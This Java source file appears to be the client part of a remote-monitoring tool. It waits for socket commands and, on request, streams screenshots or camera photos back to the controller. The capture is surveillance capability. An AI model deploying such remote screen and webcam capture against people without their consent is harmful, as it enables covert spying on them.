package Client;

import java.awt.AWTException;
import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.Socket;

import javax.swing.JOptionPane;

public class RespondAsk implements Runnable {

	private Socket socket = null;
	private boolean runningflag = true;
	private MyScreenShoot myScreenShoot;
	private MyClientPhoto myClientPhoto;
	private Object lock = new Object();

	public RespondAsk(Socket socket) {
		this.socket = socket;

	}

	@Override
	public void run() {

		while (runningflag) {
			try {
				InputStream ips = socket.getInputStream();
				BufferedReader dos = new BufferedReader(new InputStreamReader(
						ips));
				String command = dos.readLine();
				if (command == null) {
					runningflag = false;
					myScreenShoot.setRunningflag(false);
					myClientPhoto.setRunningflag(false);
					System.out.println("over run");
					JOptionPane.showMessageDialog(null, "You have been down");
				} else if (command.equals("ask screenshoot")) {

					System.out.println("start to shoot screen!");
					try {
						myScreenShoot = new MyScreenShoot(socket, this.lock);
						Thread sendScreenShoot = new Thread(myScreenShoot);
						sendScreenShoot.start();
					} catch (AWTException e) {
						e.printStackTrace();
					}

				} else if (command.equals("close screenshoot")) {

					System.out.println("start to close screenshoot");
					myScreenShoot.setRunningflag(false);

				} else if (command.equals("ask take photo")) {

					System.out.println("start to take photo!");

					myClientPhoto = new MyClientPhoto(socket, this.lock);
					Thread sendClientPhoto = new Thread(myClientPhoto);
					sendClientPhoto.start();

				} else if (command.equals("close take photo")) {

					System.out.println("start to close take photo!");
					myClientPhoto.setRunningflag(false);

				}
			} catch (Exception e) {
				System.out.println("catch");
				runningflag=false;
				if(myScreenShoot != null){
					myScreenShoot.setRunningflag(false);
				}
				if(myClientPhoto != null){
					myClientPhoto.setRunningflag(false);
				}
				e.printStackTrace();
			}// 获取socket的输出流

		}

	}


}
